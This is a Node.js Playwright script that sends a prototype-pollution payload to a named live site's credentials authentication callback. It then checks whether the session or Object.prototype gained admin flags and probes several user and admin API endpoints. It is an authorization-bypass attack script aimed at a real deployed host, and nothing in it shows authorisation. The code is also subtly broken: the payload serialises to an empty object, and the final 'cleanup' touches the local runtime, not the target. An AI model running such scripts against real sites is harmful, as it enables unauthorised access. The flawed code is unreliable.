const { chromium } = require('playwright');

(async () => {
    const browser = await chromium.launch({ headless: true });
    const page = await browser.newPage();
    
    // Navigate to site
    await page.goto('https://sturdy-octo-memory-three.vercel.app');
    await page.waitForTimeout(2000);
    
    // Send PP payload
    const ppResult = await page.evaluate(async () => {
        const res = await fetch('/api/auth/callback/credentials', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({__proto__: {isAdmin: true, role: "admin", authenticated: true}})
        });
        return { status: res.status, body: await res.text() };
    });
    console.log("PP Result:", ppResult.status);
    
    // Check session
    const session = await page.evaluate(async () => {
        const res = await fetch('/api/auth/session');
        return await res.json();
    });
    console.log("Session:", JSON.stringify(session));
    
    // Check if Object.prototype was polluted
    const polluted = await page.evaluate(() => {
        return {
            isAdmin: {}.isAdmin,
            role: {}.role,
            authenticated: {}.authenticated,
            test: {}.test
        };
    });
    console.log("Object.prototype:", JSON.stringify(polluted));
    
    // Try to access protected endpoints
    const endpoints = ['/api/users', '/api/users/admin', '/api/me'];
    for (const ep of endpoints) {
        const result = await page.evaluate(async (url) => {
            const res = await fetch(url);
            return { status: res.status, body: (await res.text()).substring(0, 200) };
        }, ep);
        console.log(`${ep}: ${result.status} - ${result.body}`);
    }
    
    await browser.close();
    
    // Cleanup: Remove polluted properties
    delete Object.prototype.isAdmin;
    delete Object.prototype.role;
    delete Object.prototype.authenticated;
    
    console.log("\n=== Test Complete ===");
})();
